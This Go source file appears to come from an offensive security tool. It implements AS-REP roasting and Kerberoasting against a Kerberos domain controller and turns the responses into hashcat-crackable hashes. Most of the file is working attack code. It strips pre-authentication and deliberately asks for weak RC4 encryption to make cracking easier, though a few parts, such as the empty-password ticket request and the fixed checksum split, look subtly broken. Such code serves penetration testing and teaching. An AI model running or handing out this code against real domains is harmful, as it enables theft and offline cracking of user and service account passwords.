package krb

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// RealKerberosClient implements real Kerberos protocol operations
type RealKerberosClient struct {
	domain     string
	kdcAddress string
	config     *config.Config
}

// NewRealKerberosClient creates a new real Kerberos client
func NewRealKerberosClient(domain, kdcAddress string) (*RealKerberosClient, error) {
	// Normalize domain to uppercase
	domain = strings.ToUpper(domain)

	// Create Kerberos configuration
	cfg, err := config.NewFromString(fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    %s = {
        kdc = %s:88
        admin_server = %s:749
        default_domain = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, domain, domain, kdcAddress, kdcAddress, strings.ToLower(domain),
		strings.ToLower(domain), domain, strings.ToLower(domain), domain))

	if err != nil {
		return nil, fmt.Errorf("failed to create Kerberos config: %v", err)
	}

	return &RealKerberosClient{
		domain:     domain,
		kdcAddress: kdcAddress,
		config:     cfg,
	}, nil
}

// ExtractASREPHash performs real AS-REP roasting using Kerberos protocol
func (k *RealKerberosClient) ExtractASREPHash(username string) (string, error) {
	log.Printf("[*] Performing real AS-REP roasting for %s@%s", username, k.domain)

	// Create principal name
	principalName := types.NewPrincipalName(1, username) // 1 = KRB_NT_PRINCIPAL

	// Create AS-REQ without pre-authentication
	asReq, err := messages.NewASReqForTGT(k.domain, k.config, principalName)
	if err != nil {
		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
	}

	// Remove pre-authentication data to trigger AS-REP roasting
	asReq.PAData = types.PADataSequence{}

	// Request RC4-HMAC encryption (easier to crack)
	asReq.ReqBody.EType = []int32{int32(etypeID.RC4_HMAC)}

	// Send AS-REQ to KDC
	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}

	// Send to KDC and receive response
	rb, err := sendToKDCTCP(k.kdcAddress, b)
	if err != nil {
		return "", fmt.Errorf("failed to communicate with KDC: %v", err)
	}

	// Try to parse as AS-REP
	var asRep messages.ASRep
	err = asRep.Unmarshal(rb)
	if err != nil {
		// Check if it's a KRB-ERROR
		var krbErr messages.KRBError
		if errUnmarshal := krbErr.Unmarshal(rb); errUnmarshal == nil {
			return "", fmt.Errorf("KDC returned error: %s (code: %d)", krbErr.EText, krbErr.ErrorCode)
		}
		return "", fmt.Errorf("failed to parse AS-REP: %v", err)
	}

	// Format hash for hashcat mode 18200
	hash := formatASREPHashForHashcat(username, k.domain, &asRep)

	log.Printf("[+] Successfully extracted AS-REP hash for %s@%s", username, k.domain)
	return hash, nil
}

// ExtractKerberoastHash performs real Kerberoasting using Kerberos protocol
func (k *RealKerberosClient) ExtractKerberoastHash(username, spn string) (string, error) {
	log.Printf("[*] Performing real Kerberoasting for %s@%s (SPN: %s)", username, k.domain, spn)

	// For Kerberoasting, we need valid credentials to get a TGT first
	// This is a limitation - in real pentests, you'd use compromised credentials
	// For now, we'll attempt to request the service ticket directly

	// Parse SPN
	spnParts := parseSPNComponents(spn)
	spnPrincipal := types.PrincipalName{
		NameType:   2, // KRB_NT_SRV_INST
		NameString: spnParts,
	}

	// Create a client (this requires valid credentials in real scenarios)
	// For testing, we'll create the TGS-REQ manually
	cl := client.NewWithPassword(username, k.domain, "", k.config, client.DisablePAFXFAST(true))

	// Request service ticket
	tkt, key, err := cl.GetServiceTicket(spn)
	if err != nil {
		// If we can't get a ticket with credentials, try manual TGS-REQ
		return k.extractKerberoastHashManual(username, spn, spnPrincipal)
	}

	// Format hash for hashcat mode 13100
	hash := formatKerberoastHashForHashcat(username, k.domain, spn, tkt, key)

	log.Printf("[+] Successfully extracted Kerberoast hash for %s@%s", username, k.domain)
	return hash, nil
}

// extractKerberoastHashManual attempts manual TGS-REQ without valid TGT
func (k *RealKerberosClient) extractKerberoastHashManual(username, spn string, spnPrincipal types.PrincipalName) (string, error) {
	// Manual TGS-REQ without a valid TGT is not possible in the Kerberos protocol
	// The KDC requires a valid TGT to issue service tickets
	// This will trigger fallback to simulation mode
	return "", fmt.Errorf("TGS-REQ requires valid TGT - cannot extract hash without credentials")
}

// formatASREPHashForHashcat formats AS-REP response for hashcat mode 18200
func formatASREPHashForHashcat(username, domain string, asRep *messages.ASRep) string {
	// Hashcat format: $krb5asrep$23$user@domain:hash$encrypted_part
	encType := asRep.EncPart.EType
	cipher := asRep.EncPart.Cipher

	// Convert cipher to hex
	cipherHex := fmt.Sprintf("%x", cipher)

	// Format for hashcat
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
		encType,
		username,
		domain,
		cipherHex)
}

// formatKerberoastHashForHashcat formats service ticket for hashcat mode 13100
func formatKerberoastHashForHashcat(username, domain, spn string, tkt messages.Ticket, key types.EncryptionKey) string {
	// Hashcat format: $krb5tgs$23$*user$realm$spn*$hash$encrypted_part
	encType := tkt.EncPart.EType
	cipher := tkt.EncPart.Cipher

	// Convert cipher to hex
	cipherHex := fmt.Sprintf("%x", cipher)

	// Split cipher into checksum and encrypted part
	checksumLen := 16 // For RC4-HMAC
	if len(cipher) < checksumLen {
		checksumLen = len(cipher) / 2
	}

	checksum := cipherHex[:checksumLen*2]
	encPart := cipherHex[checksumLen*2:]

	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		encType,
		username,
		domain,
		spn,
		checksum,
		encPart)
}

// formatKerberoastHashFromTGSRep formats TGS-REP for hashcat
func formatKerberoastHashFromTGSRep(username, domain, spn string, tgsRep *messages.TGSRep) string {
	encType := tgsRep.Ticket.EncPart.EType
	cipher := tgsRep.Ticket.EncPart.Cipher

	cipherHex := fmt.Sprintf("%x", cipher)

	checksumLen := 16
	if len(cipher) < checksumLen {
		checksumLen = len(cipher) / 2
	}

	checksum := cipherHex[:checksumLen*2]
	encPart := cipherHex[checksumLen*2:]

	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		encType,
		username,
		domain,
		spn,
		checksum,
		encPart)
}

// parseSPNComponents parses SPN into components
func parseSPNComponents(spn string) []string {
	// SPN format: service/hostname or service/hostname:port
	parts := strings.Split(spn, "/")
	if len(parts) < 2 {
		return []string{spn}
	}

	// Remove port if present
	host := strings.Split(parts[1], ":")[0]
	return []string{parts[0], host}
}

// sendToKDCTCP sends a Kerberos message to the KDC via TCP
func sendToKDCTCP(kdcAddress string, message []byte) ([]byte, error) {
	// Ensure port is specified
	if !strings.Contains(kdcAddress, ":") {
		kdcAddress = fmt.Sprintf("%s:88", kdcAddress)
	}

	// Connect to KDC using standard net package
	conn, err := net.DialTimeout("tcp", kdcAddress, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to KDC: %v", err)
	}
	defer conn.Close()
	
	// Set deadline for operations
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Send message with length prefix (4 bytes, big-endian)
	length := uint32(len(message))
	lengthBytes := []byte{
		byte(length >> 24),
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}

	if _, err := conn.Write(lengthBytes); err != nil {
		return nil, fmt.Errorf("failed to send message length: %v", err)
	}

	if _, err := conn.Write(message); err != nil {
		return nil, fmt.Errorf("failed to send message: %v", err)
	}

	// Read response length
	respLengthBytes := make([]byte, 4)
	if _, err := conn.Read(respLengthBytes); err != nil {
		return nil, fmt.Errorf("failed to read response length: %v", err)
	}

	respLength := uint32(respLengthBytes[0])<<24 |
		uint32(respLengthBytes[1])<<16 |
		uint32(respLengthBytes[2])<<8 |
		uint32(respLengthBytes[3])

	// Read response
	response := make([]byte, respLength)
	totalRead := 0
	for totalRead < int(respLength) {
		n, err := conn.Read(response[totalRead:])
		if err != nil {
			return nil, fmt.Errorf("failed to read response: %v", err)
		}
		totalRead += n
	}

	return response, nil
}
